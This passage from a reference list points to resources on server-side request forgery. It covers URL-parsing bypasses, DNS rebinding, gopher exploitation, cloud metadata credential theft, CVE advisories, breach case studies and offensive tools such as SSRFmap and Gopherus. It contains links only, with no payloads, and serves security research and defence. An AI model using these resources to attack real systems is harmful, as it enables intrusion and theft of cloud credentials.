- Claroty Team82 & Snyk — "Exploiting URL Parsing Confusion" (2022): https://claroty.com/team82/research/exploiting-url-parsing-confusion
- Snyk — "URL Confusion Vulnerabilities in the Wild": https://snyk.io/blog/url-confusion-vulnerabilities/
- PortSwigger — URL Validation Bypass Cheat Sheet: https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
- PortSwigger Research — "New Crazy Payloads in the URL Validation Bypass Cheat Sheet": https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet
- YesWeHack — "The Minefield Between Syntaxes: Exploiting Syntax Confusion": https://www.yeswehack.com/learn-bug-bounty/syntax-confusion-ambiguous-parsing-exploits

### IP Address and Hostname Manipulation

- nip.io — Wildcard DNS for Any IP Address: https://nip.io/
- HackTricks — Cloud SSRF (IP Address Alternative Representations): https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
- Cloud Metadata Dictionary for SSRF Testing (jhaddix): https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b

### Unicode and Encoding Mutations

- Jorge Lajara — "WAF Bypassing with Unicode Compatibility": https://jlajara.gitlab.io/Bypass_WAF_Unicode
- HackTricks — Unicode Normalization: https://book.hacktricks.xyz/pentesting-web/unicode-injection/unicode-normalization

### DNS Resolution Mutations

- NCC Group — Singularity of Origin: DNS Rebinding Attack Framework: https://github.com/nccgroup/singularity
- SecureLayer7 — "Server-side Request Forgery (SSRF) via DNS Rebinding Attack": https://blog.securelayer7.net/server-side-request-forgery-dns-rebinding-attack/
- Cyber Advisors — "Using DNS to Bypass SSRF Protections": https://blog.cyberadvisors.com/technical-blog/blog/using-dns-to-bypass-ssrf-protections

### Blind SSRF and Out-of-Band Techniques

- PortSwigger — Blind SSRF Vulnerabilities: https://portswigger.net/web-security/ssrf/blind
- Assetnote — "A Glossary of Blind SSRF Chains": https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
- Assetnote — Blind SSRF Chains (GitHub): https://github.com/assetnote/blind-ssrf-chains

### Injection Points: PDF, SVG, LLM

- Intigriti — "Exploiting PDF Generators: A Complete Guide to Finding SSRF Vulnerabilities": https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators
- SVG Cheatsheet — Exploiting Server-Side SVG Processors: https://github.com/allanlw/svg-cheatsheet
- svg2raster Cheatsheet — Exploiting Server-Side SVG Rasterization: https://github.com/yuriisanin/svg2raster-cheatsheet
- PortSwigger — Web LLM Attacks: https://portswigger.net/web-security/llm-attacks

### Gopher Protocol Exploitation

- Gopherus — Gopher Payload Generator: https://github.com/tarunkant/Gopherus
- PayloadsAllTheThings — SSRF Advanced Exploitation: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Advanced-Exploitation.md
- sirleeroyjenkins — "Just Gopher It: Escalating a Blind SSRF to RCE for $15k — Yahoo Mail": https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530

### Cloud Metadata Services

- AWS — Instance Metadata Service Documentation: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- AWS — Transition to Using IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-transition-to-version-2.html
- AWS Security Blog — "Get the Full Benefits of IMDSv2 and Disable IMDSv1": https://aws.amazon.com/blogs/security/get-the-full-benefits-of-imdsv2-and-disable-imdsv1-across-your-aws-infrastructure/
- Hacking The Cloud — Steal EC2 Metadata Credentials via SSRF: https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/
- Microsoft Learn — Azure Instance Metadata Service: https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service
- Google Cloud — About VM Metadata: https://docs.cloud.google.com/compute/docs/metadata/overview
- Oracle — Getting Instance Metadata: https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm
- PayloadsAllTheThings — SSRF Cloud Instances: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md

### CVE Advisories

- CVE-2025-53767 (Azure OpenAI, CVSS 10.0): https://zeropath.com/blog/cve-2025-53767
- CVE-2025-57822 (Next.js Middleware Header SSRF): https://vercel.com/changelog/cve-2025-57822
- CVE-2025-1220 (PHP fsockopen Null Byte SSRF): https://nvd.nist.gov/vuln/detail/CVE-2025-1220
- CVE-2024-22243 (Spring Framework UriComponentsBuilder): https://github.com/advisories/GHSA-ccgv-vj62-xf9h
- CVE-2024-22329 (IBM WebSphere SSRF): https://www.ibm.com/support/pages/security-bulletin-ibm-websphere-application-server-and-ibm-websphere-application-server-liberty-are-vulnerable-server-side-request-forgery-cve-2024-22329
- CVE-2024-38472 (Apache httpd UNC SSRF on Windows): https://httpd.apache.org/security/vulnerabilities_24.html
- CVE-2024-40898 (Apache httpd mod_rewrite SSRF): https://hackerone.com/reports/2612028
- CVE-2023-27592 (Miniflux SSRF): https://github.com/miniflux/v2/security/advisories/GHSA-mqqg-xjhj-wfgw

### Real-World Incidents

- Krebs on Security — "What We Can Learn from the Capital One Hack" (2019): https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/
- Appsecco — "An SSRF, Privileged AWS Keys and the Capital One Breach": https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af
- MIT CAMS — "A Case Study of the Capital One Data Breach" (PDF): https://cams.mit.edu/wp-content/uploads/capitalonedatapaper.pdf
- F5 Labs — "Campaign Targets Amazon EC2 Instance Metadata via SSRF" (March 2025): https://www.f5.com/labs/articles/threat-intelligence/campaign-targets-amazon-ec2-instance-metadata-via-ssrf
- Google Cloud Threat Intelligence — "Old Services, New Tricks: Cloud Metadata Abuse by UNC2903": https://cloud.google.com/blog/topics/threat-intelligence/cloud-metadata-abuse-unc2903/

### Offensive Tools

- SSRFmap — Automatic SSRF Fuzzer and Exploitation Tool: https://github.com/swisskyrepo/SSRFmap
- Gopherus — Gopher Link Generator: https://github.com/tarunkant/Gopherus
- Singularity of Origin — DNS Rebinding Attack Framework: https://github.com/nccgroup/singularity
- interactsh — OOB Interaction Gathering (ProjectDiscovery): https://github.com/projectdiscovery/interactsh
- REcollapse — Black-Box Regex Fuzzing for URL Validation Bypass: https://github.com/0xacb/recollapse
- SSRF-Scanner — Comprehensive SSRF Vulnerability Scanner: https://github.com/Dancas93/SSRF-Scanner
- AllThingsSSRF — SSRF Writeups, Cheatsheets, and Videos: https://github.com/jdonsec/AllThingsSSRF
- Top Disclosed SSRF Reports on HackerOne: https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPSSRF.md

### Additional Resources

- Assetnote — "Digging for SSRF in NextJS Apps": https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
- Detectify Labs — "SSRF Vulnerabilities and Where to Find Them": https://labs.detectify.com/security-guidance/ssrf-vulnerabilities-and-where-to-find-them/
- Intigriti — "SSRF: A Complete Guide to Exploiting Advanced SSRF Vulnerabilities": https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-a-complete-guide-to-exploiting-advanced-ssrf-vulnerabilities
- Qualys — "Unmasking AWS IMDSv1: The Hidden Flaw in AWS Security": https://blog.qualys.com/vulnerabilities-threat-research/2024/09/12/totalcloud-insights-unmasking-aws-instance-metadata-service-v1-imdsv1-the-hidden-flaw-in-aws-security
